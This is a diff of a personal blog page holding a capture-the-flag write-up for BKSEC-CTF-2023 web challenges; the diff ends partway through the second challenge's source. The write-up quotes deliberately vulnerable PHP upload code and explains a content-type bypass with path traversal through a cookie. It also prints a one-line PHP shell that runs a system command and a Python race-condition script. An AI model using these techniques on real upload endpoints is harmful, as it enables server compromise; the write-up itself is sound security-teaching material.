@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
   <title>BKSEC-CTF-2023 - WEB &#39;s challenges - &gt; root@l3mnt2010:~# ./exploit.py</title>
-  <meta name="description" content="WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;;$timestamp = time();$userValue = $_COOKIE[&#39;user&#39;];$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;&#39;;} elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.">
+  <meta name="description" content="WEB challs  Metadata checker  Flow: Handle: Deployment:   Image Copy resample      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.">
   <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
 {
     "@context": "http://schema.org",
@@ -59,9 +59,9 @@
     "name" : ""
   },
   "headline": "BKSEC-CTF-2023 - WEB \u0027s challenges",
-  "description" : "WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) \u0026amp;\u0026amp; !empty($_FILES)) {\r$uploadpath = \u0026quot;\/var\/tmp\/\u0026quot;;\r$error = \u0026quot;\u0026quot;;\r$timestamp = time();\r$userValue = $_COOKIE[\u0027user\u0027];\r$target_file = $uploadpath . $userValue . \u0026quot;_\u0026quot; . $timestamp . \u0026quot;_\u0026quot; . $_FILES[\u0026quot;image\u0026quot;][\u0026quot;name\u0026quot;];\rmove_uploaded_file($_FILES[\u0026quot;image\u0026quot;][\u0026quot;tmp_name\u0026quot;], $target_file);\rif ($_FILES[\u0026quot;image\u0026quot;][\u0026quot;size\u0026quot;] \u0026gt; 1048576) {\r$error .= \u0027\u0026lt;p class=\u0026quot;h5 text-danger\u0026quot;\u0026gt;Maximum file size is 1MB.\u0026lt;\/p\u0026gt;\u0027;\r} elseif ($_FILES[\u0026quot;image\u0026quot;][\u0026quot;type\u0026quot;] !== \u0026quot;image\/jpeg\u0026quot;) {\r$error .= \u0027\u0026lt;p class=\u0026quot;h5 text-danger\u0026quot;\u0026gt;Only JPG files are allowed.",
+  "description" : "WEB challs  Metadata checker  Flow: Handle: Deployment:   Image Copy resample      \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.toc {\rfont-size: 2.6rem; color: #fff; text-align: left; }\r.toc h4 {\rmargin-top: 0;\rmargin-bottom: 1rem;\rfont-size: 1.",
   "inLanguage" : "en",
-  "wordCount":  958 ,
+  "wordCount":  1331 ,
   "datePublished" : "0001-01-01T00:00:00\u002b00:00",
   "dateModified" : "0001-01-01T00:00:00\u002b00:00",
   "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
@@ -82,14 +82,14 @@
 
 
 <meta property="og:title" content="BKSEC-CTF-2023 - WEB &#39;s challenges" />
-<meta property="og:description" content="WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;;$timestamp = time();$userValue = $_COOKIE[&#39;user&#39;];$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;&#39;;} elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {$error .= &#39;&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.">
+<meta property="og:description" content="WEB challs  Metadata checker  Flow: Handle: Deployment:   Image Copy resample      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 2.6rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.">
 <meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
 <meta property="og:url" content="https://l3mnt2010.github.io/write-up/2023-08-19-bksecctf2023/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />
 
   <meta name="twitter:title" content="BKSEC-CTF-2023 - WEB &#39;s challenges" />
-  <meta name="twitter:description" content="WEB challs Metadata checker  This is whitebox challenge, you can view source below:  if (isset($_FILES) &amp;&amp; !empty($_FILES)) {$uploadpath = &quot;/var/tmp/&quot;;$error = &quot;&quot;; …">
+  <meta name="twitter:description" content="WEB challs  Metadata checker  Flow: Handle: Deployment:   Image Copy resample      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto; …">
   <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
   <meta name="twitter:card" content="summary_large_image" />
   <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
@@ -121,6 +121,12 @@
         
           
             <li>
+              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
               <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
             </li>
           
@@ -128,18 +134,6 @@
           
             <li>
               <a title="Write-up" href="https://l3mnt2010.github.io/write-up">Write-up</a>
-            </li>
-          
-        
-          
-            <li>
-              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
-            </li>
-          
-        
-          
-            <li>
-              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
             </li>
           
         
@@ -262,63 +256,283 @@
   <div class="row">
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <article role="main" class="blog-post">
-        <!-- raw HTML omitted -->
-<h1 id="web-challs">WEB challs</h1>
-<h2 id="metadata-checker">Metadata checker</h2>
+        
+  <div class="toc-container">
+    <div class="toc">
+      <nav id="TableOfContents">
+        
+        <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#web-challs">WEB challs</a>
+          <ol>
+            <li><a href="#metadata-checker">Metadata checker</a>
+              <ol>
+                <li><a href="#flow">Flow:</a></li>
+                <li><a href="#handle">Handle:</a></li>
+                <li><a href="#deployment">Deployment:</a></li>
+              </ol>
+            </li>
+            <li><a href="#image-copy-resample">Image Copy resample</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+      </nav>
+    </div>
+  </div>
+
+  <style>
+     
+    .toc-container {
+      position: fixed;
+      left: 0;
+      top: 100px;  
+      width: 350px;  
+      max-height: 80vh;
+      overflow-y: auto;
+      overflow-x: auto;
+      padding: 20px;
+      border-right: 1px solid #eee;
+      background-color: black;  
+      z-index: 100;
+      text-align: left;  
+    }
+
+    .toc {
+      font-size: 2.6rem;  
+      color: #fff;  
+      text-align: left;  
+    }
+
+    .toc h4 {
+      margin-top: 0;
+      margin-bottom: 1rem;
+      font-size: 1.6rem;  
+      text-align: left;  
+    }
+
+     
+    .toc ul, .toc ol {
+      padding-left: 0;  
+      margin: 0;
+      list-style-type: none;
+      text-align: left;  
+    }
+
+     
+    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
+      padding-left: 10px;
+    }
+
+    .toc li {
+      padding: 10px 0;
+      line-height: 1.6;
+      text-align: left;  
+    }
+
+    .toc a {
+      text-decoration: none;
+      color: #fff;  
+      display: block;
+      text-align: left;  
+      padding-left: 3px;  
+      font-size: 1.5rem;  
+      transition: color 0.2s;
+    }
+
+    .toc a:hover {
+      color: #ffcc00;  
+    }
+
+     
+    .toc a.active {
+      color: #ffcc00;  
+      font-weight: bold;
+      border-left: 4px solid #ffcc00;  
+      padding-left: 3px;  
+      margin-left: -5px;
+    }
+
+     
+    .main-content {
+      margin-left: 380px;  
+    }
+
+     
+    @media (max-width: 1200px) {
+      .toc-container {
+        width: 280px;  
+      }
+      .main-content {
+        margin-left: 320px;
+      }
+    }
+
+    @media (max-width: 900px) {
+      .toc-container {
+        position: static;
+        width: 100%;
+        max-height: none;
+        border-right: none;
+        border-bottom: 1px solid #eee;
+        margin-bottom: 20px;
+      }
+      .main-content {
+        margin-left: 0;
+      }
+    }
+  </style>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      
+      function highlightTOC() {
+        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
+        const tocLinks = document.querySelectorAll('.toc a');
+
+        if (headings.length === 0 || tocLinks.length === 0) return;
+
+        let currentActiveIndex = -1;
+        const scrollPosition = window.scrollY;
+
+        for (let i = 0; i < headings.length; i++) {
+          const heading = headings[i];
+          const headingTop = heading.offsetTop - 100;
+          const headingBottom = headingTop + heading.offsetHeight;
+
+          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
+            currentActiveIndex = i;
+            break;
+          }
+        }
+
+        tocLinks.forEach(link => link.classList.remove('active'));
+
+        if (currentActiveIndex >= 0) {
+          const currentHeading = headings[currentActiveIndex];
+          const headingId = currentHeading.id;
+
+          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
+          if (correspondingLink) {
+            correspondingLink.classList.add('active');
+
+            const tocContainer = document.querySelector('.toc-container');
+            const linkTop = correspondingLink.offsetTop;
+            const containerScrollTop = tocContainer.scrollTop;
+            const containerHeight = tocContainer.clientHeight;
+
+            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
+              tocContainer.scrollTop = linkTop - containerHeight / 2;
+            }
+          }
+        }
+      }
+
+      highlightTOC();
+      window.addEventListener('scroll', highlightTOC);
+      window.addEventListener('resize', highlightTOC);
+
+      const fragment = window.location.hash;
+      if (fragment) {
+        const element = document.querySelector(fragment);
+        if (element) {
+          element.scrollIntoView({ behavior: 'smooth' });
+
+          const tocLinks = document.querySelectorAll('.toc a');
+          tocLinks.forEach(link => {
+            link.classList.remove('active');
+            if (link.getAttribute('href') === fragment) {
+              link.classList.add('active');
+            }
+          });
+
+          highlightTOC();
+        }
+      }
+
+      const tocLinks = document.querySelectorAll('.toc a');
+      tocLinks.forEach(link => {
+        link.addEventListener('click', function(event) {
+          const targetId = link.getAttribute('href').substring(1);
+          const targetElement = document.getElementById(targetId);
+
+          if (targetElement) {
+            targetElement.scrollIntoView({ behavior: 'smooth' });
+
+            tocLinks.forEach(l => l.classList.remove('active'));
+            link.classList.add('active');
+
+            history.pushState(null, null, `#${targetId}`);
+
+            event.preventDefault();
+          }
+        });
+      });
+    });
+  </script>  
+
+
+<!-- raw HTML omitted -->
+<h2 id="web-challs">WEB challs</h2>
+<h3 id="metadata-checker">Metadata checker</h3>
 <ul>
 <li>This is whitebox challenge, you can view source below:</li>
 </ul>
-<pre><code>if (isset($_FILES) &amp;&amp; !empty($_FILES)) {
-    $uploadpath = &quot;/var/tmp/&quot;;
-    $error = &quot;&quot;;
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$uploadpath</span> <span class="o">=</span> <span class="s2">&#34;/var/tmp/&#34;</span><span class="p">;</span>
+    <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
     
-    $timestamp = time();
+    <span class="nv">$timestamp</span> <span class="o">=</span> <span class="nx">time</span><span class="p">();</span>
 
-    $userValue = $_COOKIE['user'];
-    $target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];
+    <span class="nv">$userValue</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$uploadpath</span> <span class="o">.</span> <span class="nv">$userValue</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$timestamp</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
 
-    move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $target_file);
+    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">);</span>
 
-    if ($_FILES[&quot;image&quot;][&quot;size&quot;] &gt; 1048576) {
-        $error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;Maximum file size is 1MB.&lt;/p&gt;';
-    } elseif ($_FILES[&quot;image&quot;][&quot;type&quot;] !== &quot;image/jpeg&quot;) {
-        $error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;Only JPG files are allowed.&lt;/p&gt;';
-    } else {
-      $exif = exif_read_data($target_file, 0, true);
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$error</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p class=&#34;h5 text-danger&#34;&gt;Maximum file size is 1MB.&lt;/p&gt;&#39;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&#34;image/jpeg&#34;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$error</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p class=&#34;h5 text-danger&#34;&gt;Only JPG files are allowed.&lt;/p&gt;&#39;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nv">$exif</span> <span class="o">=</span> <span class="nx">exif_read_data</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
 
-      if ($exif === false) {
-          $error .= '&lt;p class=&quot;h5 text-danger&quot;&gt;No metadata found.&lt;/p&gt;';
-      } else {
-          $metadata = '&lt;table class=&quot;table table-striped&quot;&gt;';
-          foreach ($exif as $key =&gt; $section) {
-              $metadata .=
-                  '&lt;thead&gt;&lt;tr&gt;&lt;th colspan=&quot;2&quot; class=&quot;text-center&quot;&gt;' .
-                  $key .
-                  &quot;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&quot;;
-              foreach ($section as $name =&gt; $value) {
-                  $metadata .=
-                      &quot;&lt;tr&gt;&lt;td&gt;&quot; . $name . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $value . &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;
-              }
-              $metadata .= &quot;&lt;/tbody&gt;&quot;;
-          }
-          $metadata .= &quot;&lt;/table&gt;&quot;;
-      }
-    }
-}
-?&gt;
-</code></pre><pre><code>   &lt;?php
-        // I want to show a loading effect within 1.5s here but don't know how
-        sleep(1.5);
-        // This might be okay..... I think so
-        // My teammates will help me fix it later, I hope they don't forget that
-        echo $error;
-        echo $metadata;
-        unlink($target_file);
-        ?&gt;
-</code></pre><ul>
+      <span class="k">if</span> <span class="p">(</span><span class="nv">$exif</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nv">$error</span> <span class="o">.=</span> <span class="s1">&#39;&lt;p class=&#34;h5 text-danger&#34;&gt;No metadata found.&lt;/p&gt;&#39;</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="nv">$metadata</span> <span class="o">=</span> <span class="s1">&#39;&lt;table class=&#34;table table-striped&#34;&gt;&#39;</span><span class="p">;</span>
+          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$exif</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$section</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nv">$metadata</span> <span class="o">.=</span>
+                  <span class="s1">&#39;&lt;thead&gt;&lt;tr&gt;&lt;th colspan=&#34;2&#34; class=&#34;text-center&#34;&gt;&#39;</span> <span class="o">.</span>
+                  <span class="nv">$key</span> <span class="o">.</span>
+                  <span class="s2">&#34;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#34;</span><span class="p">;</span>
+              <span class="k">foreach</span> <span class="p">(</span><span class="nv">$section</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                  <span class="nv">$metadata</span> <span class="o">.=</span>
+                      <span class="s2">&#34;&lt;tr&gt;&lt;td&gt;&#34;</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s2">&#34;&lt;/td&gt;&lt;td&gt;&#34;</span> <span class="o">.</span> <span class="nv">$value</span> <span class="o">.</span> <span class="s2">&#34;&lt;/td&gt;&lt;/tr&gt;&#34;</span><span class="p">;</span>
+              <span class="p">}</span>
+              <span class="nv">$metadata</span> <span class="o">.=</span> <span class="s2">&#34;&lt;/tbody&gt;&#34;</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="nv">$metadata</span> <span class="o">.=</span> <span class="s2">&#34;&lt;/table&gt;&#34;</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">   <span class="o">&lt;?</span><span class="nx">php</span>
+        <span class="c1">// I want to show a loading effect within 1.5s here but don&#39;t know how
+</span><span class="c1"></span>        <span class="nx">sleep</span><span class="p">(</span><span class="mf">1.5</span><span class="p">);</span>
+        <span class="c1">// This might be okay..... I think so
+</span><span class="c1"></span>        <span class="c1">// My teammates will help me fix it later, I hope they don&#39;t forget that
+</span><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$error</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$metadata</span><span class="p">;</span>
+        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">);</span>
+        <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><ul>
 <li>You can see this challenge about upload file</li>
 </ul>
-<h3 id="flow-">Flow :</h3>
+<h4 id="flow">Flow:</h4>
 <ul>
 <li>Check if exist $_FILE initialization $uploadpath = &ldquo;/var/tmp/&quot;;</li>
 <li>Get cookie &ldquo;user&rdquo; to set name $target_file.</li>
@@ -327,27 +541,27 @@
 <li>Read metadata this file to show information about it.</li>
 <li>unlink($target_file); after 1.5s.</li>
 </ul>
-<h3 id="handle-">Handle :</h3>
+<h4 id="handle">Handle:</h4>
 <ul>
 <li>It seems like this is a challenge to pass the file type check so we will change the ContentType of the file to pass this filter and to upload a php file.</li>
 <li>But one more problem here is that the php file will not be processed by the server because its location is in /var/tmp/ and observe here we can control the &ldquo;user&rdquo; cookie in $target_file, you can see:</li>
 </ul>
-<pre><code>$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];
-</code></pre><ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$uploadpath</span> <span class="o">.</span> <span class="nv">$userValue</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$timestamp</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</code></pre></div><ul>
 <li>So I will use pathtraversal technique to move my php file to /var/www/html/ so that my php file can be run.</li>
 <li>Our final problem here is that this file will be deleted after 1.5 seconds of being sent to the server, so we need to race to get the data in that time.</li>
 </ul>
-<h3 id="deployment-">Deployment :</h3>
+<h4 id="deployment">Deployment:</h4>
 <ul>
 <li>Flag in question in /flag.txt</li>
 <li>I touch a file php basic</li>
 </ul>
-<pre><code>&lt;?php echo system('cat /flag.txt');?&gt;
-</code></pre><ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat /flag.txt&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><ul>
 <li>Control $target_file:</li>
 </ul>
-<pre><code>$target_file = $uploadpath . $userValue . &quot;_&quot; . $timestamp . &quot;_&quot; . $_FILES[&quot;image&quot;][&quot;name&quot;];
-</code></pre><ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$uploadpath</span> <span class="o">.</span> <span class="nv">$userValue</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$timestamp</span> <span class="o">.</span> <span class="s2">&#34;_&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;image&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</code></pre></div><ul>
 <li>
 <p>I change $_COOKIE[&lsquo;user&rsquo;] to &ldquo;../../../../../../var/html/&rdquo;</p>
 </li>
@@ -364,72 +578,72 @@
 <p><strong>POC</strong>:</p>
 </li>
 </ul>
-<pre><code>import requests
-import time
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-url = &quot;http://18.141.143.171:30149/&quot;
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://18.141.143.171:30149/&#34;</span>
 
 
-while True:
-    file_name = &quot;_&quot; + str(int(time.time())) + &quot;_l3m.php&quot;
-    res = requests.get(url + file_name) 
-    print(res.text)
-</code></pre><h2 id="image-copy-resample">Image Copy resample</h2>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">file_name</span> <span class="o">=</span> <span class="s2">&#34;_&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span> <span class="o">+</span> <span class="s2">&#34;_l3m.php&#34;</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span> 
+    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div><h3 id="image-copy-resample">Image Copy resample</h3>
 <p>This is whitebox challenge, you can view source below:</p>
-<pre><code>&lt;?php
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
-if(isset($_FILES['image'])){
-    $upload_dir = &quot;./uploads/&quot;;
-    $file_name = $_FILES['image']['name'];
-    $file_tmp = $_FILES['image']['tmp_name'];
-    $file_type = $_FILES['image']['type'];
-    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
-    $size_check = getimagesize($file_tmp);
-    $allowed_ext = array('jpg', 'png', 'php');
-    if(in_array($file_ext, $allowed_ext)){
-        $image = imagecreatefromstring(file_get_contents($file_tmp));
-        $cropped_image = imagecreatetruecolor(40, 40);
-        imagecopyresampled($cropped_image, $image, 0, 0, 0, 0, 40, 40, imagesx($image), imagesy($image));
-        $random_name = md5(uniqid(rand(), true));
-        $new_file_name = $random_name . '.' . $file_ext;   
-        if ($file_ext === 'jpg' || $file_ext === 'png'  ) {
-            //check size
-            if ($size_check[0] &lt; 40 || $size_check[1] &lt; 40) { 
-                echo &quot;Ảnh của bạn hơi nhỏ. Chúng tôi cần ảnh lớn hơn 40x40 pixels\n&lt;br&gt;&quot;;
-            } else {
-                if($file_ext === 'jpg'){
-                    imagejpeg($cropped_image, $upload_dir . $new_file_name);
-                } else {
-                    imagepng($cropped_image, $upload_dir . $new_file_name);
-                }
-                echo &quot;ảnh đã được lưu tại đây\n&lt;br&gt;&quot;;
-                echo $upload_dir;
-                echo $new_file_name;  
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">])){</span>
+    <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s2">&#34;./uploads/&#34;</span><span class="p">;</span>
+    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+    <span class="nv">$file_tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+    <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+    <span class="nv">$size_check</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">);</span>
+    <span class="nv">$allowed_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$allowed_ext</span><span class="p">)){</span>
+        <span class="nv">$image</span> <span class="o">=</span> <span class="nx">imagecreatefromstring</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">));</span>
+        <span class="nv">$cropped_image</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+        <span class="nx">imagecopyresampled</span><span class="p">(</span><span class="nv">$cropped_image</span><span class="p">,</span> <span class="nv">$image</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="nx">imagesx</span><span class="p">(</span><span class="nv">$image</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$image</span><span class="p">));</span>
+        <span class="nv">$random_name</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(</span><span class="nx">rand</span><span class="p">(),</span> <span class="k">true</span><span class="p">));</span>
+        <span class="nv">$new_file_name</span> <span class="o">=</span> <span class="nv">$random_name</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file_ext</span><span class="p">;</span>   
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$file_ext</span> <span class="o">===</span> <span class="s1">&#39;jpg&#39;</span> <span class="o">||</span> <span class="nv">$file_ext</span> <span class="o">===</span> <span class="s1">&#39;png&#39;</span>  <span class="p">)</span> <span class="p">{</span>
+            <span class="c1">//check size
